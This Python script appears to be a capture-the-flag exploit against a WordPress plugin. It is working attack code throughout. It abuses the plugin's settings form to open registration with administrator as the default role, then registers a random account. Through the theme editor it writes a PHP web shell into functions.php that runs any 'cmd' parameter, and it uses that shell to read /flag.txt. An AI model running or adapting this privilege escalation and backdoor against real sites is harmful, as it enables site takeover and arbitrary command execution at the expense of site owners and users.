import requests
import re
import random
import string
import html

base_url = "http://154.57.164.62:31881"
session = requests.Session()

def get_nonce_settings():
    url = f"{base_url}/wp-admin/admin.php?settings=1"
    r = session.get(url)
    match = re.search(r'id="my_plugin_nonce" name="my_plugin_nonce" value="([^"]+)"', r.text)
    if match:
        return match.group(1)
    return None

def update_option(name, value, nonce):
    url = f"{base_url}/wp-admin/admin.php?settings=1"
    data = {
        "my_plugin_action": name,
        "mode": value,
        "my_plugin_nonce": nonce
    }
    r = session.post(url, data=data)
    return r.text

nonce = get_nonce_settings()
if not nonce:
    print("Failed to get settings nonce.")
    exit()
print(f"Settings Nonce: {nonce}")

update_option("users_can_register", "1", nonce)
update_option("default_role", "administrator", nonce)

username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
print(f"Registering {username}...")
r = session.post(f"{base_url}/wp-login.php?action=register", data={
    "user_login": username,
    "user_email": f"{username}@example.com",
    "wp-submit": "Register"
})

if "logged-in" in r.text:
    print("Logged in!")
else:
    print("Login failed")
    exit()

editor_url = f"{base_url}/wp-admin/theme-editor.php?file=functions.php&theme=my-theme"
r = session.get(editor_url)
nonce_match = re.search(r'id="nonce" name="nonce" value="([^"]+)"', r.text)
if not nonce_match:
    print("Failed to get theme editor nonce.")
    exit()
editor_nonce = nonce_match.group(1)
print(f"Editor Nonce: {editor_nonce}")

content_match = re.search(r'<textarea[^>]+id="newcontent"[^>]*>([\s\S]*?)</textarea>', r.text)
if not content_match:
    print("Failed to get functions.php content.")
    exit()
current_content = html.unescape(content_match.group(1))

new_content = "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);exit;} ?>\n" + current_content

data = {
    "nonce": editor_nonce,
    "_wp_http_referer": f"/wp-admin/theme-editor.php?file=functions.php&theme=my-theme",
    "theme": "my-theme",
    "file": "functions.php",
    "action": "update",
    "newcontent": new_content,
    "submit": "Update File"
}
r = session.post(f"{base_url}/wp-admin/theme-editor.php", data=data)

if "File edited successfully" in r.text:
    print("Backdoor installed!")
    r = session.get(f"{base_url}/?cmd=cat /flag.txt")
    print(f"Flag: {r.text.strip()}")
else:
    print("Failed to install backdoor.")
